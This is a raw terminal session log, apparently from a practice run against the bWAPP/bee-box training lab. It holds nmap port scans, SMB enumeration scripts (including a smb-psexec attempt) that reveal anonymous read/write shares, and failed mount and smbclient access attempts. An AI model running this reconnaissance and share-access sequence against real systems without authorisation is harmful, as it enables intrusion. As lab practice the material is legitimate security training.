@@ -1,0 +1,1669 @@
+Script started on 2020-08-17 23:43:01+05:30 [TERM="xterm-256color" TTY="/dev/pts/9" COLUMNS="135" LINES="34"]
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ l[K[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ nmap 10.10.10.7
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 23:43 IST
+Nmap scan report for 10.10.10.7
+Host is up (0.012s latency).
+Not shown: 983 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+443/tcp  open  https
+445/tcp  open  microsoft-ds
+512/tcp  open  exec
+513/tcp  open  login
+514/tcp  open  shell
+666/tcp  open  doom
+3306/tcp open  mysql
+5901/tcp open  vnc-1
+6001/tcp open  X11:1
+8080/tcp open  http-proxy
+8443/tcp open  https-alt
+9080/tcp open  glrpc
+
+Nmap done: 1 IP address (1 host up) scanned in 13.14 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ nmap -sV -p 139 10.10.10.8[K7
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 23:45 IST
+Nmap scan report for 10.10.10.7
+Host is up (0.0016s latency).
+
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ITSECGAMES)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.13 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ local[Kte .nse | grep n[Ksmb
+/usr/share/nmap/scripts/smb-brute.nse
+/usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse
+/usr/share/nmap/scripts/smb-enum-domains.nse
+/usr/share/nmap/scripts/smb-enum-groups.nse
+/usr/share/nmap/scripts/smb-enum-processes.nse
+/usr/share/nmap/scripts/smb-enum-services.nse
+/usr/share/nmap/scripts/smb-enum-sessions.nse
+/usr/share/nmap/scripts/smb-enum-shares.nse
+/usr/share/nmap/scripts/smb-enum-users.nse
+/usr/share/nmap/scripts/smb-flood.nse
+/usr/share/nmap/scripts/smb-ls.nse
+/usr/share/nmap/scripts/smb-mbenum.nse
+/usr/share/nmap/scripts/smb-os-discovery.nse
+/usr/share/nmap/scripts/smb-print-text.nse
+/usr/share/nmap/scripts/smb-protocols.nse
+/usr/share/nmap/scripts/smb-psexec.nse
+/usr/share/nmap/scripts/smb-security-mode.nse
+/usr/share/nmap/scripts/smb-server-stats.nse
+/usr/share/nmap/scripts/smb-system-info.nse
+/usr/share/nmap/scripts/smb-vuln-conficker.nse
+/usr/share/nmap/scripts/smb-vuln-cve-2017-7494.nse
+/usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse
+/usr/share/nmap/scripts/smb-vuln-ms06-025.nse
+/usr/share/nmap/scripts/smb-vuln-ms07-029.nse
+/usr/share/nmap/scripts/smb-vuln-ms08-067.nse
+/usr/share/nmap/scripts/smb-vuln-ms10-054.nse
+/usr/share/nmap/scripts/smb-vuln-ms10-061.nse
+/usr/share/nmap/scripts/smb-vuln-ms17-010.nse
+/usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse
+/usr/share/nmap/scripts/smb-vuln-webexec.nse
+/usr/share/nmap/scripts/smb-webexec-exploit.nse
+/usr/share/nmap/scripts/smb2-capabilities.nse
+/usr/share/nmap/scripts/smb2-security-mode.nse
+/usr/share/nmap/scripts/smb2-time.nse
+/usr/share/nmap/scripts/smb2-vuln-uptime.nse
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ nma[Kap 10.10.10.8[K7 --script smb-enum-domains.nse
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 23:50 IST
+Nmap scan report for 10.10.10.7
+Host is up (0.016s latency).
+Not shown: 983 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+443/tcp  open  https
+445/tcp  open  microsoft-ds
+512/tcp  open  exec
+513/tcp  open  login
+514/tcp  open  shell
+666/tcp  open  doom
+3306/tcp open  mysql
+5901/tcp open  vnc-1
+6001/tcp open  X11:1
+8080/tcp open  http-proxy
+8443/tcp open  https-alt
+9080/tcp open  glrpc
+
+Host script results:
+|_smb-enum-domains: ERROR: Script execution failed (use -d to debug)
+
+Nmap done: 1 IP address (1 host up) scanned in 14.12 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ nmap 10.10.10.7 --script smb-enum-domains.nse -d
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 23:51 IST
+PORTS: Using top 1000 ports found open (TCP:1000, UDP:0, SCTP:0)
+--------------- Timing report ---------------
+  hostgroups: min 1, max 100000
+  rtt-timeouts: init 1000, min 100, max 10000
+  max-scan-delay: TCP 1000, UDP 1000, SCTP 1000
+  parallelism: min 0, max 0
+  max-retries: 10, host-timeout: 0
+  min-rate: 0, max-rate: 0
+---------------------------------------------
+NSE: Using Lua 5.3.
+NSE: Arguments from CLI: 
+NSE: Loaded 1 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 1) scan.
+Initiating NSE at 23:51
+Completed NSE at 23:51, 0.00s elapsed
+Initiating Ping Scan at 23:51
+Scanning 10.10.10.7 [2 ports]
+Completed Ping Scan at 23:51, 0.00s elapsed (1 total hosts)
+Overall sending rates: 1314.92 packets / s.
+mass_rdns: Using DNS server 10.10.10.1
+Initiating Parallel DNS resolution of 1 host. at 23:51
+mass_rdns: 13.00s 0/1 [#: 1, OK: 0, NX: 0, DR: 0, SF: 0, TR: 3]
+Completed Parallel DNS resolution of 1 host. at 23:51, 13.00s elapsed
+DNS resolution of 1 IPs took 13.00s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
+Initiating Connect Scan at 23:51
+Scanning 10.10.10.7 [1000 ports]
+Discovered open port 443/tcp on 10.10.10.7
+Discovered open port 21/tcp on 10.10.10.7
+Discovered open port 8080/tcp on 10.10.10.7
+Discovered open port 445/tcp on 10.10.10.7
+Discovered open port 139/tcp on 10.10.10.7
+Discovered open port 25/tcp on 10.10.10.7
+Discovered open port 22/tcp on 10.10.10.7
+Discovered open port 80/tcp on 10.10.10.7
+Discovered open port 3306/tcp on 10.10.10.7
+Discovered open port 514/tcp on 10.10.10.7
+Discovered open port 513/tcp on 10.10.10.7
+Discovered open port 512/tcp on 10.10.10.7
+Discovered open port 6001/tcp on 10.10.10.7
+Discovered open port 8443/tcp on 10.10.10.7
+Discovered open port 9080/tcp on 10.10.10.7
+Discovered open port 666/tcp on 10.10.10.7
+Discovered open port 5901/tcp on 10.10.10.7
+Completed Connect Scan at 23:51, 0.08s elapsed (1000 total ports)
+Overall sending rates: 11880.58 packets / s.
+NSE: Script scanning 10.10.10.7.
+NSE: Starting runlevel 1 (of 1) scan.
+Initiating NSE at 23:51
+NSE: Starting smb-enum-domains against 10.10.10.7.
+NSE: [smb-enum-domains 10.10.10.7] SMB: Added account '' to account list
+NSE: [smb-enum-domains 10.10.10.7] SMB: Added account 'guest' to account list
+NSE: [smb-enum-domains 10.10.10.7] SMB: Extended login to 10.10.10.7 as BEE-BOX\guest failed (NT_STATUS_LOGON_FAILURE)
+NSE: [smb-enum-domains 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: smb-enum-domains against 10.10.10.7 threw an error!
+/usr/bin/../share/nmap/nselib/msrpctypes.lua:847: attempt to perform arithmetic on a nil value (local 'pos')
+stack traceback:
+	/usr/bin/../share/nmap/nselib/msrpctypes.lua:847: in function 'msrpctypes.unmarshall_int32'
+	/usr/bin/../share/nmap/nselib/msrpc.lua:1418: in function 'msrpc.samr_enumdomains'
+	/usr/bin/../share/nmap/nselib/msrpc.lua:4506: in function 'msrpc.get_domains'
+	/usr/bin/../share/nmap/scripts/smb-enum-domains.nse:73: in function </usr/bin/../share/nmap/scripts/smb-enum-domains.nse:71>
+	(...tail calls...)
+
+Completed NSE at 23:51, 0.08s elapsed
+Nmap scan report for 10.10.10.7
+Host is up, received syn-ack (0.014s latency).
+Scanned at 2020-08-17 23:51:06 IST for 13s
+Not shown: 983 closed ports
+Reason: 983 conn-refused
+PORT     STATE SERVICE      REASON
+21/tcp   open  ftp          syn-ack
+22/tcp   open  ssh          syn-ack
+25/tcp   open  smtp         syn-ack
+80/tcp   open  http         syn-ack
+139/tcp  open  netbios-ssn  syn-ack
+443/tcp  open  https        syn-ack
+445/tcp  open  microsoft-ds syn-ack
+512/tcp  open  exec         syn-ack
+513/tcp  open  login        syn-ack
+514/tcp  open  shell        syn-ack
+666/tcp  open  doom         syn-ack
+3306/tcp open  mysql        syn-ack
+5901/tcp open  vnc-1        syn-ack
+6001/tcp open  X11:1        syn-ack
+8080/tcp open  http-proxy   syn-ack
+8443/tcp open  https-alt    syn-ack
+9080/tcp open  glrpc        syn-ack
+Final times for host: srtt: 14274 rttvar: 363  to: 100000
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 1) scan.
+Initiating NSE at 23:51
+Completed NSE at 23:51, 0.00s elapsed
+Read from /usr/bin/../share/nmap: nmap-payloads nmap-services.
+Nmap done: 1 IP address (1 host up) scanned in 13.51 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ nmap 10.10.10.7 --script smb-enum-domains.nse -d[K[23Plocate .nse | grep smb | less
+[?1049h[22;0;0t[?1h=/usr/share/nmap/scripts/smb-brute.nse
+/usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse
+/usr/share/nmap/scripts/smb-enum-domains.nse
+/usr/share/nmap/scripts/smb-enum-groups.nse
+/usr/share/nmap/scripts/smb-enum-processes.nse
+/usr/share/nmap/scripts/smb-enum-services.nse
+/usr/share/nmap/scripts/smb-enum-sessions.nse
+/usr/share/nmap/scripts/smb-enum-shares.nse
+/usr/share/nmap/scripts/smb-enum-users.nse
+/usr/share/nmap/scripts/smb-flood.nse
+/usr/share/nmap/scripts/smb-ls.nse
+/usr/share/nmap/scripts/smb-mbenum.nse
+/usr/share/nmap/scripts/smb-os-discovery.nse
+/usr/share/nmap/scripts/smb-print-text.nse
+/usr/share/nmap/scripts/smb-protocols.nse
+/usr/share/nmap/scripts/smb-psexec.nse
+/usr/share/nmap/scripts/smb-security-mode.nse
+/usr/share/nmap/scripts/smb-server-stats.nse
+/usr/share/nmap/scripts/smb-system-info.nse
+/usr/share/nmap/scripts/smb-vuln-conficker.nse
+/usr/share/nmap/scripts/smb-vuln-cve-2017-7494.nse
+/usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse
+/usr/share/nmap/scripts/smb-vuln-ms06-025.nse
+/usr/share/nmap/scripts/smb-vuln-ms07-029.nse
+/usr/share/nmap/scripts/smb-vuln-ms08-067.nse
+/usr/share/nmap/scripts/smb-vuln-ms10-054.nse
+/usr/share/nmap/scripts/smb-vuln-ms10-061.nse
+/usr/share/nmap/scripts/smb-vuln-ms17-010.nse
+/usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse
+/usr/share/nmap/scripts/smb-vuln-webexec.nse
+/usr/share/nmap/scripts/smb-webexec-exploit.nse
+/usr/share/nmap/scripts/smb2-capabilities.nse
+/usr/share/nmap/scripts/smb2-security-mode.nse
+:[K[K[?1l>[?1049l[23;0;0t]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ nmap -p [Klocate .nse | grep smb | lessnmap 10.10.10.7 --script smb-enum-domains.nse -d[K[23Plocate .nse | grep smbnmap -sV -p 139 10.10.10.7[C[C[C[C[C[C[1P[1P[1P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C --script smb-server-stats.nse
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 23:53 IST
+Debugging Increased to 1.
+mass_rdns: 13.00s 0/1 [#: 1, OK: 0, NX: 0, DR: 0, SF: 0, TR: 3]
+DNS resolution of 1 IPs took 13.00s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
+Overall sending rates: 577.03 packets / s.
+NSE: Script scanning 10.10.10.7.
+NSE: Starting runlevel 1 (of 1) scan.
+NSE: Starting smb-server-stats against 10.10.10.7.
+NSE: [smb-server-stats 10.10.10.7] SMB: Added account '' to account list
+NSE: [smb-server-stats 10.10.10.7] SMB: Added account 'guest' to account list
+NSE: [smb-server-stats 10.10.10.7] SMB: Trying to start NetBIOS session with name = 'BEE-BOX'
+NSE: [smb-server-stats 10.10.10.7] SMB: Extended login to 10.10.10.7 as BEE-BOX\guest failed (NT_STATUS_LOGON_FAILURE)
+NSE: [smb-server-stats 10.10.10.7] SMB: WARNING: the server appears to be Unix; your mileage may vary.
+NSE: Finished smb-server-stats against 10.10.10.7.
+Nmap scan report for 10.10.10.7
+Host is up (0.0016s latency).
+Scanned at 2020-08-17 23:53:18 IST for 13s
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+Final times for host: srtt: 1618 rttvar: 3763  to: 100000
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 1) scan.
+Read from /usr/bin/../share/nmap: nmap-payloads nmap-services.
+Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ nmap  -p 139 10.10.10.7 --script smb-server-stats.nse[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Ksmb-enum-shares.nse
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 23:54 IST
+Nmap scan report for 10.10.10.7
+Host is up (0.0020s latency).
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: <blank>
+|   \\10.10.10.7\CutePDF_Writer:3: 
+|     Type: STYPE_PRINTQ
+|     Comment: CutePDF Writer
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\Fax:2: 
+|     Type: STYPE_PRINTQ
+|     Comment: Fax
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\Fax_-_HP_Officejet_6500_E710a-f_(Network):4: 
+|     Type: STYPE_PRINTQ
+|     Comment: Fax - HP Officejet 6500 E710a-f (Network)
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\HP_Officejet_6500_E710a-f_(Network):5: 
+|     Type: STYPE_PRINTQ
+|     Comment: HP Officejet 6500 E710a-f (Network)
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (bee-box server (Samba 3.0.28a))
+|     Users: 1
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|   \\10.10.10.7\Microsoft_XPS_Document_Writer:1: 
+|     Type: STYPE_PRINTQ
+|     Comment: Microsoft XPS Document Writer
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\PDF: 
+|     Type: STYPE_PRINTQ
+|     Comment: PDF
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\Send_To_OneNote_2010:8: 
+|     Type: STYPE_PRINTQ
+|     Comment: Send To OneNote 2010
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\Snagit_9:6: 
+|     Type: STYPE_PRINTQ
+|     Comment: Snagit 9
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\Xerox_Phaser_8500DN_PS:7: 
+|     Type: STYPE_PRINTQ
+|     Comment: Xerox Phaser 8500DN PS
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\opt: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: <none>
+|   \\10.10.10.7\tmp: 
+|     Type: STYPE_DISKTREE
+|     Comment: oh noes!
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|_    Anonymous access: READ/WRITE
+
+Nmap done: 1 IP address (1 host up) scanned in 14.54 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ nmap  -p 139 10.10.10.7 --script smb-enum-shares.nse | grep Anonymous access"[C[C[C[C[C[1@"
+|     Anonymous access: <none>
+|     Anonymous access: <none>
+|     Anonymous access: <none>
+|     Anonymous access: <none>
+|     Anonymous access: READ/WRITE
+|     Anonymous access: <none>
+|     Anonymous access: <none>
+|     Anonymous access: <none>
+|     Anonymous access: <none>
+|     Anonymous access: <none>
+|     Anonymous access: <none>
+|     Anonymous access: <none>
+|_    Anonymous access: READ/WRITE
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ nmap  -p 139 10.10.10.7 --script smb-enum-shares.nse | grep "Anonymous access"[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Ksmb-enum-users.nse
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 00:00 IST
+Nmap scan report for 10.10.10.7
+Host is up (0.0014s latency).
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+
+Host script results:
+|_smb-enum-users: ERROR: Script execution failed (use -d to debug)
+
+Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ nmap  -p 139 10.10.10.7 --script smb-enum-users.nse[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[C smb-psexec.nse 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 00:00 IST
+Nmap scan report for 10.10.10.7
+Host is up (0.0015s latency).
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+
+Nmap done: 1 IP address (1 host up) scanned in 15.51 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ l[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ l[K[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ nmap  -p 139 10.10.10.7 --script smb-psexec.nse enum-users.nseshares.nse | grep "Anonymous access"[K
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 00:04 IST
+Nmap scan report for 10.10.10.7
+Host is up (0.0041s latency).
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: <blank>
+|   \\10.10.10.7\CutePDF_Writer:3: 
+|     Type: STYPE_PRINTQ
+|     Comment: CutePDF Writer
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\Fax:2: 
+|     Type: STYPE_PRINTQ
+|     Comment: Fax
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\Fax_-_HP_Officejet_6500_E710a-f_(Network):4: 
+|     Type: STYPE_PRINTQ
+|     Comment: Fax - HP Officejet 6500 E710a-f (Network)
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\HP_Officejet_6500_E710a-f_(Network):5: 
+|     Type: STYPE_PRINTQ
+|     Comment: HP Officejet 6500 E710a-f (Network)
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (bee-box server (Samba 3.0.28a))
+|     Users: 1
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|   \\10.10.10.7\Microsoft_XPS_Document_Writer:1: 
+|     Type: STYPE_PRINTQ
+|     Comment: Microsoft XPS Document Writer
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\PDF: 
+|     Type: STYPE_PRINTQ
+|     Comment: PDF
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\Send_To_OneNote_2010:8: 
+|     Type: STYPE_PRINTQ
+|     Comment: Send To OneNote 2010
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\Snagit_9:6: 
+|     Type: STYPE_PRINTQ
+|     Comment: Snagit 9
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\Xerox_Phaser_8500DN_PS:7: 
+|     Type: STYPE_PRINTQ
+|     Comment: Xerox Phaser 8500DN PS
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\opt: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: <none>
+|   \\10.10.10.7\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: <none>
+|   \\10.10.10.7\tmp: 
+|     Type: STYPE_DISKTREE
+|     Comment: oh noes!
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|_    Anonymous access: READ/WRITE
+
+Nmap done: 1 IP address (1 host up) scanned in 14.47 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ mount -t cifs \\10.10.10.7\tmp /mnt/ 
+mount.cifs: permission denied: no match for /mnt found in /etc/fstab
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ mount -t cifs \\10.10.10.7\tmp /mnt/ [1P[1@/[1P[1P[1@/[1@/
+mount.cifs: permission denied: no match for /mnt found in /etc/fstab
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ ;[K[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ smbmo[Kap [K [K[K[K[K[Kbclient smb-enum-shares[Kmount -t cifs //10.10.10.7/tmp /mnt/ \\10.10.10.7\[C[C[C[C[C[C[C[C[C[C[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1@s[1@m[1@b[1@c[1@l[4@ient[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[K[K[K[K[K[K 
+
+\10.10.10.7tmp: Not enough '\' characters in service
+Usage: smbclient [-?EgqBVNkPeC] [-?|--help] [--usage] [-R|--name-resolve=NAME-RESOLVE-ORDER] [-M|--message=HOST]
+        [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST] [-m|--max-protocol=LEVEL] [-T|--tar=<c|x>IXFqgbNan]
+        [-D|--directory=DIR] [-c|--command=STRING] [-b|--send-buffer=BYTES] [-t|--timeout=SECONDS] [-p|--port=PORT]
+        [-g|--grepable] [-q|--quiet] [-B|--browse] [-d|--debuglevel=DEBUGLEVEL] [-s|--configfile=CONFIGFILE]
+        [-l|--log-basename=LOGFILEBASE] [-V|--version] [--option=name=value] [-O|--socket-options=SOCKETOPTIONS]
+        [-n|--netbiosname=NETBIOSNAME] [-W|--workgroup=WORKGROUP] [-i|--scope=SCOPE] [-U|--user=USERNAME] [-N|--no-pass]
+        [-k|--kerberos] [-A|--authentication-file=FILE] [-S|--signing=on|off|required] [-P|--machine-pass] [-e|--encrypt]
+        [-C|--use-ccache] [--pw-nt-hash] service <password>
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Arbitrary_File_Access-Samba[01;31mdinesh@evil[00m: [[01;34mArbitrary_File_Access-Samba[00m] $ smbclient \\10.10.10.7\tmp [1P[1@/[1P[1P[1@/[1@/
+protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
